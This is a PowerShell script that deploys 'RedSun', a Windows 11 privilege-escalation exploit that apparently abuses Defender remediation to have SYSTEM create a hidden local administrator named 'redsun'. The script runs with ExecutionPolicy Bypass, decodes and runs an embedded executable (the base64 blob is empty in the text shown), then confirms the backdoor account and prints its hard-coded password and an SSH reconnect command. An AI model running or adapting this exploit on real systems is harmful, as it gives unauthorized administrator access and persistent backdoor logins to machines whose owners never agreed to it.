# RedSun single-file deploy script.
#
# - RedSun.exe is pre-built (MSVC x64, links CldApi/ntdll/synchronization/user32/
#   advapi32/ole32/netapi32) and embedded below as a base64 blob.
# - On run: decode, execute, wait for Defender remediation + SYSTEM-side account
#   creation, then verify that 'redsun' exists and is in Administrators.
#
# Run from any session (SSH, RDP, local) on a Windows 11 target with Defender RTP
# on. No MSVC install required on the target — everything is in this file.
#
# Usage:
#   powershell -ExecutionPolicy Bypass -File .\deploy_redsun.ps1
#   powershell -ExecutionPolicy Bypass -File .\deploy_redsun.ps1 -KeepExe
#
# -KeepExe                 Leave the decoded RedSun.exe on disk after the run.

param(
    [string]$OutDir = "$Env:TEMP\RedSun-run",
    [switch]$KeepExe
)

$ErrorActionPreference = 'Stop'

function Info($m) { Write-Host "[+] $m" -ForegroundColor Cyan }
function Warn($m) { Write-Host "[!] $m" -ForegroundColor Yellow }
function Die($m)  { Write-Host "[x] $m" -ForegroundColor Red; exit 1 }

# --- Embedded RedSun.exe ---
$B64 = @'

'@

# --- Decode ---
New-Item -ItemType Directory -Force -Path $OutDir | Out-Null
$exePath = Join-Path $OutDir 'RedSun.exe'
Info "Decoding embedded RedSun.exe to $exePath"
$bytes = [Convert]::FromBase64String(($B64 -replace '\s',''))
[IO.File]::WriteAllBytes($exePath, $bytes)
Info "Wrote $($bytes.Length) bytes, SHA256 $((Get-FileHash $exePath -Algorithm SHA256).Hash)"

# --- Run ---
Write-Host ""
Info "Running RedSun.exe (Defender remediation usually takes ~30s)..."
$runOut = & cmd.exe /c "`"$exePath`"" 2>&1
$runOut | ForEach-Object { Write-Host "    $_" }

# --- Verify ---
Write-Host ""
$user = Get-LocalUser -Name redsun -ErrorAction SilentlyContinue
$inAdmins = $false
if ($user) {
    $inAdmins = [bool] (Get-LocalGroupMember -Group Administrators -ErrorAction SilentlyContinue |
                       Where-Object { $_.SID -eq $user.SID })
}

if ($user -and $inAdmins) {
    Info 'EoP succeeded. New local administrator:'
    Write-Host "      Name    : $($user.Name)"
    Write-Host "      SID     : $($user.SID)"
    Write-Host "      Enabled : $($user.Enabled)"
    Write-Host "      Password: NewPass123"
    Write-Host ""
    Info 'Administrators group members now:'
    Get-LocalGroupMember -Group Administrators | ForEach-Object { Write-Host "      $($_.Name)" }
    $ip = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
           Where-Object { $_.IPAddress -notmatch '^(127\.|169\.254\.)' } |
           Select-Object -First 1).IPAddress
    if ($ip) {
        Write-Host ""
        Info "Reconnect with:  ssh redsun@$ip    (password NewPass123)"
    }
} elseif ($user) {
    Warn "User 'redsun' exists but is NOT in Administrators."
    Write-Host "      Name : $($user.Name)"
    Write-Host "      SID  : $($user.SID)"
} else {
    Warn "User 'redsun' was not created."
    Warn 'Check Defender state:'
    Write-Host '    Get-MpComputerStatus | Select RealTimeProtectionEnabled, IsTamperProtected, AntivirusSignatureVersion'
}

if (-not $KeepExe) {
    Remove-Item $exePath -ErrorAction SilentlyContinue
}

